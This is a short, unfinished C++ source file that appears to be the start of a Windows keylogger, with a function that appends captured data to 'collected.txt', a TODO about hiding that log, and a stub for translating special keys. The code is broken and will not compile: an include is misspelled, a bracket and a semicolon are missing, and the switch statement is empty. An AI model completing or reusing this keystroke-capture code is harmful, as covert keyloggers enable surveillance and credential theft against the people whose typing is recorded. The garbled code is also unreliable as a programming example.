#include <iostrean>
#include <fstream>
#include <windows.h
#include <bits/stdc++.h>

// path to log file
// TODO make this hidden?
#define LOG_FILE "collected.txt"

// save the data to the log file
void collectData(std::string data)
{
    std::fstream logFile;

    // open the file
    // std::ios::app makes new daata append instead of overwriting
    logFile.open(LOG_FILE, std::ios::app)

        // write the data
        logFile
        << data;

    // end fiel stream
    logFile.close();
}

// conversions for special keys (space, enter, tab etc)
std::string translateKeys(int key) {
    std::string result; 

    switch
}